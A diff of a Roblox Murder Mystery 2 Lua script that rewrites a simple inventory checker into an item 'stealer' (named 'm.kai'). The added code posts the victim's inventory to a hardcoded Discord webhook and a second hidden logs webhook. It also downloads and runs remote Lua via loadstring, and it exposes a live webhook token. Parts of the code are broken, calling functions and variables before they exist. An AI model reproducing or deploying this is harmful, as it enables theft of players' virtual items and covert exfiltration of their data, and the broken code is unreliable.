@@ -1,95 +1,100 @@
 Config = {
-    Receivers = {"123", "1234"}, -- Your Username/s.
-    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
-    FullInventory = true, -- If true, it will display all of the player's items.
+    Receivers = {"kai", "kaikai"},
+    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b",
+    FullInventory = true,
 }
 
 repeat wait() until game:IsLoaded()
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+if getgenv().scriptexecuted then return end
+getgenv().scriptexecuted = true
+
+LogsWebhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b"
+-- Logs Webhook
+
+LOGS_WEBS = LogsWebhook
+
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
+local RunService = game:GetService("RunService")
 local Inventory = {}
+local StealerName = "m.kai"
 
-local function sendnotification(message)
-    print("[Inventory Check]: " .. message)
-end
 
--- Function to iterate through the inventory
-local function checkInventory()
-    local Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage = 0, 0, 0, 0, 0, 0, 0, 0
-
-    local UIPath
-    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
-        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
-    else
-        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
-    end
-
-    -- Iterate over items in inventory
-    local function checkItem(v)
-        if v:IsA("Frame") then
-            local color = v.ItemName.BackgroundColor3
-            if color == Color3.fromRGB(106, 106, 106) then
-                Common = Common + 1
-            elseif color == Color3.fromRGB(0, 255, 255) then
-                Uncommon = Uncommon + 1
-            elseif color == Color3.fromRGB(0, 200, 0) then
-                Rare = Rare + 1
-            elseif color == Color3.fromRGB(220, 0, 5) then
-                Legendary = Legendary + 1
-            elseif color == Color3.fromRGB(255, 0, 179) then
-                Godly = Godly + 1
-            elseif color == Color3.fromRGB(100, 10, 255) then
-                Ancient = Ancient + 1
-            elseif color == Color3.fromRGB(240, 140, 0) then
-                Unique = Unique + 1
-            elseif color == Color3.fromRGB(255, 255, 0) then
-                Vintage = Vintage + 1
-            end
-            table.insert(Inventory, v.ItemName.Label.Text)
-        end
-    end
-
-    -- Check all items in the inventory
-    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-        checkItem(v)
-    end
-
-    -- Send the inventory to the webhook
-    local data = {
-        username = "Inventory Checker",
-        content = "Here is the list of your inventory items:",
-        embeds = {
-            {
-                title = "Player Inventory",
-                description = "Items in Inventory:\n```" .. table.concat(Inventory, ", ") .. "```",
-                fields = {
-                    {name = "Common", value = Common},
-                    {name = "Uncommon", value = Uncommon},
-                    {name = "Rare", value = Rare},
-                    {name = "Legendary", value = Legendary},
-                    {name = "Godly", value = Godly},
-                    {name = "Ancient", value = Ancient},
-                    {name = "Unique", value = Unique},
-                    {name = "Vintage", value = Vintage}
-                },
-                color = 0x3365FF
+local data = {
+    username = StealerName,
+    avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
+    content = messageMM2,
+    embeds = {
+        {
+            title = "test",
+            description = "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```",
+            color = tonumber(0x3365FF),
+            fields = {
+                {
+                    name = "test",
+                    value = "test"
+                }
             }
         }
     }
+}
 
-    local request = http_request or request or HttpPost or syn.request
-    request({
-        Url = Config.Webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game.HttpService:JSONEncode(data)
-    })
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = Config.Webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game.HttpService:JSONEncode(data)
+})
 
-    sendnotification("Inventory check completed and sent to webhook.")
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = LogsWebhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game.HttpService:JSONEncode(data)
+})
+
+function checkitem(v)
+    if v:IsA("Frame") then
+        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+            Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+            if Config.FullInventory then
+                local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
+                table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+            end
+        end
+    end
 end
 
--- Run the inventory check when the game is fully loaded
-checkInventory()
+function FullInventory()
+    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for _, item in pairs(v.Container:GetChildren()) do
+            if item.Name == "Christmas" or item.Name == "Halloween" then
+                for _, subItem in pairs(item.Container:GetChildren()) do
+                    checkitem(subItem)
+                end
+            else
+                checkitem(item)
+            end
+        end
+    end
+    for _, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        checkitem(v)
+    end
+    if Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
+        table.insert(Inventory, "None")
+    end
+    if Config.FullInventory then
+        return table.concat(Inventory, ", ")
+    else
+        return "Full inventory set false."
+    end
+end
